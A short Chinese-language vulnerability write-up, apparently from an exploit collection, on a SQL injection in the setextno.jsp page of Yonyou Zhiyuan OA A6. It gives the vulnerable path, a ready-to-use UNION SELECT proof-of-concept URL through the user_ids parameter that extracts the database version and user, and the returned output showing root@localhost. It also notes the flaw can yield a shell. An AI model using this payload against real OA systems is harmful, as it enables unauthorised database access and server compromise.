致远OA A6 setextno.jsp sql注入漏洞
==================================

一、漏洞简介
------------

用友致远A6协同系统SQL注入，union可shell

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

##### 漏洞位置:

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp

##### 漏洞详情:

    版本：A6用友致远A6协同系统SQL注入，union可shell

##### 请求方式:

    Get

##### POC:

    http://www.0-sec.org/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23

##### 回显内容

    5.0.41-community-nt 
    分机号root@localhos
